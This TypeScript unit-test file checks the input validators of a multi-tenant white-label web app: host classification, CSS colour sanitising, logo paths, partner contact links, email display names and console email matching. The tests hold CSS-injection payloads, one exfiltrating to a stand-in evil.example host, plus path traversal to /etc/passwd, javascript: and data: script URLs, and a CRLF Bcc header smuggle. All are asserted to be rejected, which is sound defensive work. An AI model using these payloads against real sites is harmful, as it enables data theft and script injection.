/**
 * Unit tests for the Phase 3 pure logic. No database, no network.
 *
 * These cover the two functions where a quiet mistake has the widest blast
 * radius:
 *
 *   classifyHost  decides WHICH TENANT a request is for. Misread a host as
 *                 "apex" and you serve Prime PEO's own book to whoever asked;
 *                 misread the apex as a partner and multi-tenancy silently
 *                 stops working.
 *
 *   safeColor     is a CSS-injection boundary. Its output is interpolated into
 *                 `<style>{":root{...}"}</style>`, where React escapes `<` but
 *                 NOT `}` or `;`, because the content of a <style> element is
 *                 CSS rather than HTML.
 *
 * Run: npx tsx scripts/test-unit.mts
 */
import { existsSync, readFileSync } from "node:fs";
import { describe, ok, equal, done } from "./lib/harness";
import { classifyHost, APEX_HOST } from "../lib/tenant/host";
import {
  parseBranding,
  brandingToCss,
  contrastRatio,
  logoUrl,
  __testables,
} from "../lib/tenant/branding";
import { imageInfo } from "../lib/tenant/image-size";
import { brandFor, formatFrom, houseBrand, inboxList, parseSender } from "../lib/tenant/email-brand";
import { landingBrand } from "../app/components/landing/landing-sections";
import { partnerContact, partnerLegalName, partnerVoice, voiceFor } from "../lib/tenant/partner";
import {
  CONSENT_SMS_TEXT,
  CONSENT_TERMS_TEXT,
  PRIVACY_VERSION,
  SUBMIT_NOTICE_TEXT,
  TERMS_VERSION,
  splitConsentLinks,
} from "../lib/legal";
import { STEPS } from "../lib/discovery/schema";
import { CONSOLE_EMAIL_RE, escapeLike } from "../lib/console/email-match";
import { iconLetter, letterTileSvg, logoIconSvg, partnerIcon, tenantIcons } from "../lib/tenant/favicon.js";
import {
  slugifyStage,
  validateStageLabel,
  stageTone,
  defaultStage,
  selectableStages,
  PROTECTED_STAGE_SLUG,
  toStage,
  type Stage,
} from "../lib/console/stages";

const { safeColor, safePath, safeText, safeInt, safeContact } = __testables;
const apex = APEX_HOST.split(":")[0]!;

// ===========================================================================
describe("classifyHost: hosts that must resolve to the HOUSE tenant");
// ===========================================================================
for (const h of [apex, `${apex}:3000`, `www.${apex}`, `WWW.${apex.toUpperCase()}`]) {
  equal(classifyHost(h).kind, "apex", `"${h}"`);
}
// Vercel-assigned hosts serve the house site. Without this a preview URL is
// read as a request for the tenant "prime-vintage-git-main-abc123".
for (const h of ["prime-vintage.vercel.app", "x-git-main-abc.vercel.app", "vercel.app"]) {
  equal(classifyHost(h).kind, "apex", `"${h}" (Vercel-assigned)`);
}
// Reserved labels are infrastructure. A tenant must never be able to claim a
// slug that shadows them, and tenants.slug alone cannot express that.
for (const label of ["www", "api", "admin", "console", "portal", "assets", "cdn", "staging", "mail"]) {
  equal(classifyHost(`${label}.${apex}`).kind, "apex", `"${label}." is reserved`);
}

// ===========================================================================
describe("classifyHost: hosts that must resolve to a PARTNER");
// ===========================================================================
const partners: [string, string][] = [
  [`acme.${apex}`, "acme"],
  [`acme.${apex}:3000`, "acme"],
  [`ACME.${apex}`, "acme"],
  [`  acme.${apex}  `, "acme"],
  [`a-b-c.${apex}`, "a-b-c"],
  [`p1.${apex}`, "p1"],
  [`ab.${apex}`, "ab"],
  [`${"a".repeat(63)}.${apex}`, "a".repeat(63)],
];
for (const [host, slug] of partners) {
  const r = classifyHost(host);
  ok(r.kind === "partner" && r.slug === slug, `"${host}" -> ${slug}`,
     r.kind === "partner" ? undefined : `got ${JSON.stringify(r)}`);
}

// ===========================================================================
describe("classifyHost: hosts that must be UNKNOWN, never a silent fallback");
// ===========================================================================
/*
  "unknown" has to be distinct from "apex". A typo'd or spoofed Host that fell
  back to the house tenant would serve the client's own leads to whoever sent
  it, so absence of a match must mean 404, not "default".
*/
for (const h of [null, undefined, "", "   ", ":3000"]) {
  equal(classifyHost(h as string).kind, "unknown", `${JSON.stringify(h)} (empty)`);
}
for (const h of ["evil.com", `acme.${apex}.evil.com`, "notourdomain.co.uk"]) {
  equal(classifyHost(h).kind, "unknown", `"${h}" (not our domain)`);
}
// Two labels deep: a wildcard TLS cert does not cover it, so treating it as a
// partner would promise what the certificate cannot deliver.
equal(classifyHost(`a.b.${apex}`).kind, "unknown", `"a.b.${apex}" (two labels)`);
// Below or above what tenants.slug can hold.
equal(classifyHost(`x.${apex}`).kind, "unknown", `1-char label (DB minimum is 2)`);
equal(classifyHost(`${"a".repeat(64)}.${apex}`).kind, "unknown", `64-char label (DNS max is 63)`);
for (const bad of ["under_score", "Ünicode", "-", "has space", "dot.dot"]) {
  equal(classifyHost(`${bad}.${apex}`).kind, "unknown", `"${bad}" is not a legal slug`);
}

// ===========================================================================
describe("safeColor: the CSS-injection boundary");
// ===========================================================================
for (const good of ["#fff", "#FFF", "#ff2d00", "#19233bff", " #fff "]) {
  ok(safeColor(good) !== undefined, `accepts ${JSON.stringify(good)}`);
}
equal(safeColor("#FF2D00"), "#ff2d00", "normalises case");

/*
  Every entry below is a working payload if the allowlist is relaxed. They are
  kept as literals rather than generated, so the file itself documents what is
  being defended against.
*/
const payloads: [unknown, string][] = [
  ["red}body{display:none}", "closes the rule and opens another"],
  ["#fff}html{opacity:0}", "hides the page"],
  ["red;background-image:url(https://evil.example/?c=1)", "exfiltrates on paint"],
  ["#fff;position:fixed", "appends a declaration"],
  ["url(https://evil.example)", "remote fetch"],
  ["rgb(255,0,0)", "parenthesised function"],
  ["oklch(0.7 0.1 20)", "parenthesised function"],
  ["var(--pv-ink)", "indirection"],
  ["expression(alert(1))", "legacy IE expression"],
  ["#fff/**/;x:y", "comment smuggling"],
  ["#gggggg", "non-hex digits"],
  ["#ff", "too short"],
  ["#ff2d0", "5 digits"],
  ["fff", "missing #"],
  ["transparent", "keyword"],
  ["currentColor", "keyword"],
  ["inherit", "keyword"],
  ["", "empty"],
  [null, "null"],
  [undefined, "undefined"],
  [123, "number"],
  [{}, "object"],
  [[], "array"],
];
for (const [payload, why] of payloads) {
  equal(safeColor(payload), undefined, `rejects ${JSON.stringify(payload)} (${why})`);
}

// ===========================================================================
describe("brandingToCss: output is structurally safe, whatever went in");
// ===========================================================================
/*
  Asserted as a PROPERTY of the output rather than by trusting safeColor: every
  emitted declaration must be one of ours, with a value that is a hex or a
  color-mix over a hex. This holds even if the regex is later weakened.
*/
const hostile = parseBranding(
  {
    companyName: "Acme",
    colors: {
      accent: "red}body{display:none}",
      ink: "#123456",
      dark: "url(https://evil.example)",
      accentPress: "#fff;x:y",
    },
  },
  "Fallback",
);
const css = brandingToCss(hostile);
ok(!css.includes("}"), "emits no closing brace");
ok(!css.includes("url("), "emits no url(");
ok(!css.includes("red"), "drops the rejected accent");
ok(!css.includes("evil"), "drops the rejected dark colour");
ok(css.includes("--pv-ink:#123456"), "keeps the one valid colour");
const SAFE_DECL =
  /^--pv-[a-z-]+:(#[0-9a-f]{3,8}|color-mix\(in oklab,#[0-9a-f]{3,8} \d+%,(white|black)\))$/;
for (const decl of css.split(";")) {
  ok(SAFE_DECL.test(decl), `declaration is a safe --pv-* value: ${JSON.stringify(decl)}`);
}

// An unbranded tenant must emit NOTHING, so the house palette stands rather
// than being overridden with empty values.
equal(brandingToCss(parseBranding({}, "Acme")), "", "unbranded tenant emits no CSS");
equal(brandingToCss(parseBranding({ colors: {} }, "Acme")), "", "colors:{} emits no CSS");
// Derived greys follow the ink, so a partner sets one colour and the family
// relationship in the brand guide survives.
const inked = brandingToCss(parseBranding({ colors: { ink: "#101820" } }, "A"));
ok(inked.includes("--pv-ink-soft:color-mix"), "derives ink-soft from ink");
ok(inked.includes("--pv-ink-muted:color-mix"), "derives ink-muted from ink");

// ===========================================================================
describe("parseBranding: coerces, never throws");
// ===========================================================================
/*
  A thrown error here would 500 a partner's whole portal over one bad field, so
  every input must degrade to the house default instead.
*/
for (const raw of [null, undefined, [], 42, "nope", true, {}, { colors: "red" }, { logo: 7 }]) {
  let threw = false;
  let name = "";
  try {
    name = parseBranding(raw, "House Co").companyName ?? "";
  } catch {
    threw = true;
  }
  ok(!threw && name === "House Co",
     `${JSON.stringify(raw)} degrades to the tenant name`,
     threw ? "it threw" : `companyName was ${JSON.stringify(name)}`);
}
equal(parseBranding({}, "Acme Brokers").companyName, "Acme Brokers",
      "an unbranded tenant renders its own name, not the house brand");
equal(parseBranding({ companyName: "  Acme  " }, "X").companyName, "Acme", "trims");
equal(parseBranding({ companyName: "a".repeat(200) }, "X").companyName, "X",
      "over-long name falls back rather than breaking the header");
equal(parseBranding({ supportEmail: "not-an-email" }, "X").supportEmail, undefined,
      "rejects a malformed support email");
equal(parseBranding({ supportEmail: "ops@acme.com" }, "X").supportEmail, "ops@acme.com",
      "keeps a valid support email");

// ===========================================================================
describe("logo: all three dimensions or none, and no third-party origins");
// ===========================================================================
equal(parseBranding({ logo: { path: "a/b.png" } }, "X").logo, undefined,
      "a logo without width/height is dropped (it would shift the header)");
equal(parseBranding({ logo: { path: "a/b.png", width: 200, height: 40 } }, "X").logo?.path,
      "a/b.png", "a complete logo survives");
equal(parseBranding({ logo: { path: "a/b.png", width: 200, height: 40, displayHeight: 999 } }, "X")
        .logo?.displayHeight, undefined, "an out-of-range displayHeight is dropped");
/*
  safePath is why branding.logo.path is a BUCKET PATH and not a URL: a branding
  row must not be able to point a partner's header at an origin the client does
  not control.
*/
for (const bad of [
  "https://evil.example/logo.png",
  "//evil.example/logo.png",
  "/etc/passwd",
  "../../secret.png",
  "a/../../b.png",
  "data:image/svg+xml;base64,AAAA",
]) {
  equal(safePath(bad), undefined, `safePath rejects ${JSON.stringify(bad)}`);
}
equal(safePath("tenants/acme/logo.png"), "tenants/acme/logo.png", "accepts a plain bucket path");
ok(logoUrl("tenants/acme/logo.png").includes("/storage/v1/object/public/tenant-logos/"),
   "logoUrl resolves a bucket path against the public storage endpoint");

// ===========================================================================
describe("safeText / safeInt bounds");
// ===========================================================================
equal(safeText("  hi  ", 10), "hi", "safeText trims");
equal(safeText("", 10), undefined, "safeText rejects empty");
equal(safeText("abc", 2), undefined, "safeText enforces max length");
equal(safeText(42, 10), undefined, "safeText rejects a non-string");
equal(safeInt(20, 16, 48), 20, "safeInt accepts in range");
equal(safeInt(15, 16, 48), undefined, "safeInt rejects below min");
equal(safeInt(49, 16, 48), undefined, "safeInt rejects above max");
equal(safeInt(Number.NaN, 16, 48), undefined, "safeInt rejects NaN");
equal(safeInt(Infinity, 16, 48), undefined, "safeInt rejects Infinity");
equal(safeInt("20", 16, 48), 20, "safeInt coerces a numeric string");

// ===========================================================================
describe("contrastRatio: the branding form's accessibility gate");
// ===========================================================================
equal(Math.round(contrastRatio("#ffffff", "#000000")), 21, "black on white is 21:1");
equal(contrastRatio("#ffffff", "#ffffff"), 1, "a colour against itself is 1:1");
ok(Math.abs(contrastRatio("#000", "#fff") - contrastRatio("#fff", "#000")) < 1e-9,
   "is symmetric");
// globals.css documents the house orange as failing AA for body text, which is
// why it is restricted to large text and the mark. A partner should be held to
// at least the same standard.
const orange = contrastRatio("#ff2d00", "#ffffff");
ok(orange > 3 && orange < 4.5,
   `the house orange sits between 3:1 and 4.5:1 on white (${orange.toFixed(2)})`);
ok(contrastRatio("#19233b", "#ffffff") > 4.5, "navy on white passes AA");
// A pale accent is exactly the palette the form must refuse.
ok(contrastRatio("#ffe9a8", "#ffffff") < 3, "a pale yellow accent is under 3:1 and must be refused");

// ===========================================================================
describe("stage helpers (Phase 2, re-checked because Phase 3 seeds them per tenant)");
// ===========================================================================
/*
  provision-tenant.mts seeds these four slugs for every new partner, and
  submissions_default_stage() raises if a tenant has none. So the slug rules
  are now load-bearing for partner onboarding, not just the admin screen.
*/
equal(slugifyStage("In Progress"), "in-progress", "slugify lowercases and hyphenates");
equal(slugifyStage("  Closed  "), "closed", "slugify trims");
equal(PROTECTED_STAGE_SLUG, "new",
      "the protected slug is 'new', matching the 0001 column default");
/*
  Built through toStage() from the raw DB row shape rather than hand-written as
  Stage objects. That way this fixture also exercises the row -> Stage mapping
  the server actually performs, so a column rename in a migration surfaces here
  rather than at runtime.
*/
const stages: Stage[] = [
  { id: "1", slug: "new", label: "New", sort_order: 10, is_default: true, is_terminal: false, tone: "neutral", retired_at: null },
  { id: "2", slug: "closed", label: "Closed", sort_order: 40, is_default: false, is_terminal: true, tone: "positive", retired_at: null },
  { id: "3", slug: "old", label: "Old", sort_order: 50, is_default: false, is_terminal: false, tone: "neutral", retired_at: "2026-01-01T00:00:00Z" },
].map(toStage);

equal(stages[0]!.isDefault, true, "toStage maps is_default -> isDefault");
equal(stages[2]!.retired, true, "toStage maps a non-null retired_at -> retired");
equal(defaultStage(stages)?.slug, "new", "defaultStage finds the default stage");
equal(selectableStages(stages).length, 2, "selectableStages excludes the retired stage");
ok(stageTone("nonexistent", stages) !== undefined,
   "an unknown slug still yields a Badge variant rather than an unstyled badge");

// validateStageLabel returns a message string, or "" when the label is fine.
ok(validateStageLabel("New", stages) !== "", "a duplicate stage label is rejected");
equal(validateStageLabel("Qualified", stages), "", "a fresh stage label is accepted");
ok(validateStageLabel("", stages) !== "", "an empty stage label is rejected");
ok(validateStageLabel("x".repeat(61), stages) !== "", "an over-long stage label is rejected");
// A rename must not collide with itself.
equal(validateStageLabel("New", stages, { ignoreId: "1" }), "",
      "renaming a stage to its own current label is allowed");

// ===========================================================================
describe("imageInfo: type by magic bytes, size from the container header");
// ===========================================================================
/*
  Fixtures are hand-built headers, not real files: the parser reads only the
  first ~30 bytes, and a fixture that shows those bytes is a better spec than
  a binary blob. Each one mirrors the layout described in image-size.ts.
*/
function pngHeader(w: number, h: number): Uint8Array {
  const b = new Uint8Array(33);
  b.set([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a], 0);
  b.set([0, 0, 0, 13], 8);
  b.set([0x49, 0x48, 0x44, 0x52], 12); // IHDR
  new DataView(b.buffer).setUint32(16, w, false);
  new DataView(b.buffer).setUint32(20, h, false);
  return b;
}
function riff(chunk: string, body: Uint8Array): Uint8Array {
  const b = new Uint8Array(20 + body.length + 12);
  b.set([0x52, 0x49, 0x46, 0x46], 0); // RIFF
  b.set([0x57, 0x45, 0x42, 0x50], 8); // WEBP
  for (let i = 0; i < 4; i++) b[12 + i] = chunk.charCodeAt(i);
  b.set(body, 20);
  return b;
}
function vp8(w: number, h: number): Uint8Array {
  const body = new Uint8Array(12);
  body.set([0x9d, 0x01, 0x2a], 3); // start code
  body[6] = w & 0xff; body[7] = (w >> 8) & 0x3f;
  body[8] = h & 0xff; body[9] = (h >> 8) & 0x3f;
  return riff("VP8 ", body);
}
function vp8l(w: number, h: number): Uint8Array {
  const body = new Uint8Array(12);
  body[0] = 0x2f;
  const bits = (w - 1) | ((h - 1) << 14);
  body[1] = bits & 0xff; body[2] = (bits >> 8) & 0xff; body[3] = (bits >> 16) & 0xff; body[4] = (bits >>> 24) & 0xff;
  return riff("VP8L", body);
}
function vp8x(w: number, h: number): Uint8Array {
  const body = new Uint8Array(12);
  const cw = w - 1, ch = h - 1;
  body[4] = cw & 0xff; body[5] = (cw >> 8) & 0xff; body[6] = (cw >> 16) & 0xff;
  body[7] = ch & 0xff; body[8] = (ch >> 8) & 0xff; body[9] = (ch >> 16) & 0xff;
  return riff("VP8X", body);
}

equal(JSON.stringify(imageInfo(pngHeader(640, 120))), JSON.stringify({ kind: "png", width: 640, height: 120 }), "PNG IHDR");
equal(JSON.stringify(imageInfo(vp8(300, 90))), JSON.stringify({ kind: "webp", width: 300, height: 90 }), "WebP lossy (VP8)");
equal(JSON.stringify(imageInfo(vp8l(512, 128))), JSON.stringify({ kind: "webp", width: 512, height: 128 }), "WebP lossless (VP8L)");
equal(JSON.stringify(imageInfo(vp8x(1000, 250))), JSON.stringify({ kind: "webp", width: 1000, height: 250 }), "WebP extended (VP8X)");

equal(imageInfo(new TextEncoder().encode('<svg xmlns="http://www.w3.org/2000/svg"></svg>')), null,
      "SVG is rejected whatever the upload claims to be");
equal(imageInfo(new Uint8Array([0xff, 0xd8, 0xff, 0xe0, ...new Array(40).fill(0)])), null, "JPEG is rejected");
equal(imageInfo(pngHeader(640, 120).subarray(0, 20)), null, "a truncated PNG header is rejected, not read past the end");
equal(imageInfo(pngHeader(0, 120)), null, "a zero dimension is rejected");
equal(imageInfo(pngHeader(4001, 120)), null, "a dimension above parseBranding's 4000 cap is rejected here too");
{
  const bad = vp8(300, 90);
  bad[24] = 0x00; // break the start code
  equal(imageInfo(bad), null, "a VP8 chunk without its start code is rejected");
}
equal(imageInfo(riff("ALPH", new Uint8Array(12))), null, "an unexpected first WebP chunk is rejected");

// ===========================================================================
describe("email brand: one verified sender, the tenant's name on it");
// ===========================================================================
equal(JSON.stringify(parseSender("Prime PEO Brokers <notifications@primevantagehcm.com>")),
      JSON.stringify({ name: "Prime PEO Brokers", address: "notifications@primevantagehcm.com" }),
      "Name <addr> is split");
equal(parseSender("notifications@primevantagehcm.com").address, "notifications@primevantagehcm.com",
      "a bare address is kept");
equal(parseSender("notifications@primevantagehcm.com").name, "Prime PEO Brokers",
      "a bare address gets the house display name");
equal(parseSender(undefined).address, "onboarding@resend.dev", "unset falls back to the Resend onboarding sender");
equal(parseSender('"Quoted Name" <a@b.co>').name, "Quoted Name", "a quoted display name is unquoted");

const sender = parseSender("Prime PEO Brokers <notifications@primevantagehcm.com>");
equal(formatFrom("Acme Brokers", sender), '"Acme Brokers" <notifications@primevantagehcm.com>',
      "the partner's name goes on the house address");
equal(formatFrom('Acme "The Best" <Brokers>\r\nBcc: x', sender),
      '"Acme The Best Brokers Bcc: x" <notifications@primevantagehcm.com>',
      "quotes, angle brackets and line breaks cannot escape the display name");
equal(formatFrom("   ", sender), '"Prime PEO Brokers" <notifications@primevantagehcm.com>',
      "an empty name falls back to the sender's own");

{
  const partner = brandFor({
    slug: "acme",
    name: "Acme Brokers LLC",
    isHouse: false,
    branding: parseBranding(
      {
        companyName: "Acme Brokers",
        supportEmail: "ops@acme.com",
        colors: { accent: "#0055aa", ink: "#101820" },
        logo: { path: "t/logo.png", width: 400, height: 100 },
      },
      "Acme Brokers LLC",
    ),
  });
  equal(partner.isHouse, false, "a partner brand is not the house");
  equal(partner.name, "Acme Brokers", "display name comes from branding.companyName");
  equal(partner.replyTo, "ops@acme.com", "reply-to is the partner's contact address");
  equal(partner.accent, "#0055aa", "accent is the validated hex");
  equal(partner.ink, "#101820", "ink is the validated hex");
  ok(partner.origin.startsWith("http") && partner.origin.includes("acme."),
     "origin is the partner's own subdomain");
  ok(!!partner.logo && partner.logo.url.includes("/tenant-logos/t/logo.png") && partner.logo.width === 400,
     "logo resolves through logoUrl with its intrinsic size");

  const bare = brandFor({ slug: "bare", name: "Bare Co", isHouse: false, branding: parseBranding({}, "Bare Co") });
  equal(bare.name, "Bare Co", "an unbranded partner is named by its tenant name");
  equal(bare.replyTo, undefined, "no contact address means no reply-to, not the house inbox");
  equal(bare.logo, undefined, "no logo means a text-only header");
  equal(bare.accent, undefined, "no colours means house tokens");
}
equal(brandFor(null).isHouse, true, "no tenant degrades to the house brand");
equal(brandFor({ slug: "x", name: "X", isHouse: true, branding: {} }).name, "Prime PEO Brokers",
      "the house tenant is always the house brand, whatever its row says");
ok(houseBrand().logo?.url.endsWith("/brand/email-mark.png") === true, "the house mark is the hosted PNG");

// LEAD_NOTIFY_EMAIL as a list. Production had two addresses joined by a comma
// and Resend 422d every send that carried the raw string, as `to` or as
// `reply_to`. The list must reach Resend as an array, and reply-to as one address.
equal(JSON.stringify(inboxList("admin@x.com,garrett@x.com")), JSON.stringify(["admin@x.com", "garrett@x.com"]),
      "a comma-joined inbox list splits into addresses");
equal(JSON.stringify(inboxList(" a@x.com ; b@x.com\nc@x.com ")), JSON.stringify(["a@x.com", "b@x.com", "c@x.com"]),
      "semicolons, whitespace and newlines also separate");
equal(JSON.stringify(inboxList("a@x.com,,not-an-address")), JSON.stringify(["a@x.com"]), "junk entries are dropped");
equal(JSON.stringify(inboxList("")), "[]", "empty means no inbox");
equal(JSON.stringify(inboxList(undefined)), "[]", "unset means no inbox");
{
  const prev = process.env.LEAD_NOTIFY_EMAIL;
  process.env.LEAD_NOTIFY_EMAIL = "admin@x.com,garrett@x.com";
  equal(houseBrand().replyTo, "admin@x.com", "house reply-to is the first inbox, never the joined string");
  process.env.LEAD_NOTIFY_EMAIL = "";
  equal(houseBrand().replyTo, undefined, "no inbox means no reply-to");
  if (prev === undefined) delete process.env.LEAD_NOTIFY_EMAIL; else process.env.LEAD_NOTIFY_EMAIL = prev;
}


// ---------------------------------------------------------------------------
describe("landing page: what a partner's own marketing page must not say");
// ---------------------------------------------------------------------------
// The house page and a partner page are one component. Getting these wrong
// puts Prime's inbox, Prime's name or Prime's licensing claim on a domain
// belonging to someone else, which is the whole point of the white-label.

{
  const house = landingBrand(null);
  equal(house.brandName, "Prime PEO Brokers", "the house route keeps the house name");
  equal(house.contact.href, "mailto:admin@primepeobrokers.com", "the house route keeps the house inbox");
  equal(house.legalName, null, "the house route names no referral partner in its footer");
  equal(house.voice("our team"), "our team", "the house route keeps its own first-person copy");
  ok(house.showPartnerSection, "the house site still recruits partners");
  ok(!house.isPartner, "a null tenant is not a partner");
}

{
  // The house TENANT (resolved on the apex), not just the null route.
  const b = landingBrand({ isHouse: true, name: "Prime PEO Brokers", branding: {} });
  equal(b.brandName, "Prime PEO Brokers", "the house tenant renders as the house");
  ok(b.showPartnerSection, "the house tenant still recruits partners");
}

{
  const b = landingBrand({
    isHouse: false,
    name: "Acme Advisors",
    branding: { companyName: "Acme Benefits", supportEmail: "hello@acme.com" },
  });
  equal(b.brandName, "Acme Benefits", "a partner is named by branding.companyName");
  equal(b.contact.href, "mailto:hello@acme.com", "a partner's visitors reach the PARTNER, not Prime");
  equal(b.legalName, "Acme Benefits", "no legal name set: the footer names the display name");
  equal(b.voice("our team"), "Prime\u2019s advisory team", "a partner page names Prime's team");
  ok(!b.showPartnerSection, "a partner site does not recruit partners for Prime");
  ok(b.isPartner, "a non-house tenant is a partner");
}

{
  // The onboarding case: a partner created minutes ago, nothing filled in.
  const b = landingBrand({ isHouse: false, name: "Acme Advisors", branding: {} });
  equal(b.brandName, "Acme Advisors", "an unbranded partner falls back to its tenant name");
  equal(b.contact.href, "mailto:admin@primepeobrokers.com",
        "no contact and no supportEmail means Prime's inbox, never a dead mailto");
  ok(!b.showPartnerSection, "an unbranded partner still does not recruit partners");
}


// ---------------------------------------------------------------------------
describe("partner tenants: counsel's copy, contact and disclosure rules");
// ---------------------------------------------------------------------------
// Counsel, October 2026: on a partner's site the visitor must be able to tell
// that Prime provides the service. First-person copy written for Prime's own
// site reads as the partner's there, so it is rewritten to name Prime.

equal(partnerVoice("an expert on our team does the legwork"),
      "an expert on Prime’s advisory team does the legwork", "our team -> Prime's advisory team");
equal(partnerVoice("Our team benchmarks your terms"),
      "Prime’s advisory team benchmarks your terms", "Our team (sentence start)");
equal(partnerVoice("Your advisor reviews the record"),
      "Your Prime advisor reviews the record", "Your advisor -> Your Prime advisor");
equal(partnerVoice("anything else your advisor should know"),
      "anything else your Prime advisor should know", "your advisor -> your Prime advisor");
equal(partnerVoice("We hold agreements across the market"),
      "Prime holds agreements across the market", "We hold agreements -> Prime holds agreements");
equal(partnerVoice("Your assigned advisor and their team."),
      "Your assigned Prime advisor and their team.", "the longer phrase wins over 'your advisor'");
equal(partnerVoice("Visible to your broker’s team only"),
      "Visible to Prime’s advisory team only",
      "the sensitive-data notice does not tell a partner's visitor the partner sees their payroll");
{
  const once = partnerVoice("Your advisor and our team. We hold agreements.");
  equal(partnerVoice(once), once, "partnerVoice is idempotent (no 'Prime Prime advisor')");
}
equal(voiceFor(null)("your advisor"), "your advisor", "voiceFor(null) is the identity");

// Every step string the flow renders through the voice still reads correctly.
for (const step of STEPS) {
  for (const text of [step.intro, ...step.fields.flatMap((f) => [f.label, f.help ?? "", f.placeholder ?? ""])]) {
    ok(!/\bPrime Prime\b/.test(partnerVoice(text)), `no doubled "Prime" in: ${text.slice(0, 50)}`);
  }
}

{
  const acme = { isHouse: false, name: "Acme Advisors", branding: {} as Record<string, unknown> };
  const c1 = partnerContact({ ...acme, branding: { contactUrl: "https://acme.com/contact", supportEmail: "ops@acme.com", companyName: "Acme" } });
  equal(c1.href, "https://acme.com/contact", "the contact setting wins over the work email");
  ok(!c1.isEmail, "a URL contact is not printed as an address");
  equal(c1.label, "Acme", "a URL contact is labelled with the partner's name");
  const c2 = partnerContact({ ...acme, branding: { contactUrl: "talk@acme.com", supportEmail: "ops@acme.com" } });
  equal(c2.href, "mailto:talk@acme.com", "an email contact becomes a mailto");
  equal(partnerLegalName({ ...acme, branding: { legalName: "Acme Advisors LLC", companyName: "Acme" } }),
        "Acme Advisors LLC", "the legal name is named in the disclosure when set");
  equal(partnerLegalName({ isHouse: true, name: "Prime PEO Brokers", branding: {} }), null,
        "the house tenant names no referral partner");
}

// ---------------------------------------------------------------------------
describe("partner contact: an href on a public page, so an injection boundary");
// ---------------------------------------------------------------------------
equal(safeContact("https://acme.com/contact"), "https://acme.com/contact", "https URL accepted");
equal(safeContact("ops@acme.com"), "ops@acme.com", "email accepted");
for (const bad of [
  "javascript:alert(1)",
  "JAVASCRIPT:alert(1)",
  "javascript:alert(1)//@x.com",
  "data:text/html,<script>alert(1)</script>",
  "http://acme.com",
  "//evil.com",
  "acme.com/contact",
  "",
]) {
  equal(safeContact(bad), undefined, `rejected: ${JSON.stringify(bad)}`);
}
equal(parseBranding({ contactUrl: "javascript:alert(1)" }, "Acme").contactUrl, undefined,
      "parseBranding drops a hostile contact rather than rendering it");

// Counsel: partners cannot add scripts, pixels or content. Branding is a
// closed shape; an unknown key never reaches a page.
{
  const parsed = parseBranding(
    { script: "<script>", pixel: "https://t.co/p.gif", footerDisclosure: "x", consentText: "x", companyName: "Acme" },
    "Acme",
  ) as Record<string, unknown>;
  for (const k of ["script", "pixel", "footerDisclosure", "consentText"]) {
    ok(!(k in parsed), `parseBranding never carries "${k}"`);
  }
  const sql = readFileSync("supabase/migrations/0015_partner_compliance_and_consent.sql", "utf8");
  const allow = sql.match(/if v_key not in \(([\s\S]*?)\) then/)?.[1] ?? "";
  const keys = [...allow.matchAll(/'([A-Za-z]+)'/g)].map((m) => m[1]).sort();
  equal(keys.join(","),
        "colors,companyName,contactUrl,crmPartnerName,legalName,logo,shortName,supportEmail",
        "the database allowlist admits exactly the branding keys and nothing that could carry content");
}

// ---------------------------------------------------------------------------
describe("consent: what is shown is what is stored");
// ---------------------------------------------------------------------------
{
  const parts = splitConsentLinks(CONSENT_TERMS_TEXT);
  equal(parts.map((p) => p.text).join(""), CONSENT_TERMS_TEXT,
        "the rendered consent, links included, is byte for byte the stored sentence");
  equal(parts.filter((p) => p.href).map((p) => p.href).join(","), "/terms,/privacy",
        "both Terms and Privacy are linked, in that order");
  ok(CONSENT_TERMS_TEXT.includes("Section 14 of the Terms"), "the consent cites Section 14 for arbitration");
  ok(/^\d{4}-\d{2}-\d{2}$/.test(TERMS_VERSION) && /^\d{4}-\d{2}-\d{2}$/.test(PRIVACY_VERSION),
     "version dates are ISO, since they are written to a date column");
  ok(CONSENT_SMS_TEXT.includes("Reply STOP to opt out"), "the call/text consent carries STOP");
  ok(SUBMIT_NOTICE_TEXT.startsWith("By clicking Submit"), "the notice under Submit is counsel's");
  for (const t of [CONSENT_TERMS_TEXT, CONSENT_SMS_TEXT, SUBMIT_NOTICE_TEXT]) {
    ok(!t.includes("\u2014"), "no em dash in the legal copy");
  }
}
{
  // Section 14 must still BE arbitration, and 2A must not shift numbering.
  const terms = readFileSync("app/terms/page.tsx", "utf8");
  ok(/heading="14\. Dispute resolution and arbitration"/.test(terms),
     "Terms section 14 is still arbitration, which the consent text cites by number");
  ok(/heading="3\. Compensation disclosure"/.test(terms),
     "Terms section 3 is still compensation, which section 2A cites by number");
  ok(terms.includes('heading="2A. Partner-branded Sites"'), "the partner section is numbered 2A");
}
{
  // Phone sits on the step that renders the call/text consent beside it.
  const last = STEPS[STEPS.length - 1]!;
  ok(last.fields.some((f) => f.id === "phone"), "phone is on step 6, beside its consent");
  ok(STEPS.slice(0, -1).every((s) => !s.fields.some((f) => f.id === "phone")),
     "phone appears on no other step");
  const flow = readFileSync("app/discovery/discovery-flow.tsx", "utf8");
  ok(!/localStorage[\s\S]{0,200}termsAccepted|termsAccepted[\s\S]{0,40}localStorage/.test(flow),
     "consent is never persisted to the browser draft");
  ok(/disabled=\{busy \|\| !termsAccepted\}/.test(flow), "Submit stays disabled until the Terms box is ticked");
  const actions = readFileSync("app/discovery/actions.ts", "utf8");
  ok(/consent\?\.terms !== true/.test(actions), "the server refuses a submission without the Terms consent");
  ok(actions.indexOf("recordConsent(saved.handle") < actions.indexOf('status: "complete"'),
     "the consent record is written before the lead is marked complete");
}


// ---------------------------------------------------------------------------
describe("console email matching: no LIKE wildcards reach a query");
// ---------------------------------------------------------------------------
// An address from the Partners form lands in a PostgREST .ilike() filter,
// where `%` and `_` are wildcards. `%@partner.com` would match an arbitrary
// other user on the tenant and mail THEM a working sign-in link.

ok(CONSOLE_EMAIL_RE.test("ops@partner.com"), "an ordinary address is accepted");
ok(CONSOLE_EMAIL_RE.test("first.last+tag@sub.partner.co"), "dots and plus tags are accepted");
ok(!CONSOLE_EMAIL_RE.test("%@partner.com"), "a bare % local part is refused");
ok(!CONSOLE_EMAIL_RE.test("ops%@partner.com"), "% anywhere in the local part is refused");
ok(!CONSOLE_EMAIL_RE.test("_@partner.com"), "a bare _ local part is refused");
ok(!CONSOLE_EMAIL_RE.test("ops@%.com"), "% in the domain is refused");
ok(!CONSOLE_EMAIL_RE.test("ops@partner.c%m"), "% in the TLD is refused");
ok(!CONSOLE_EMAIL_RE.test("not-an-address"), "a string with no @ is still refused");
ok(!CONSOLE_EMAIL_RE.test("ops@partner"), "a domain with no dot is still refused");

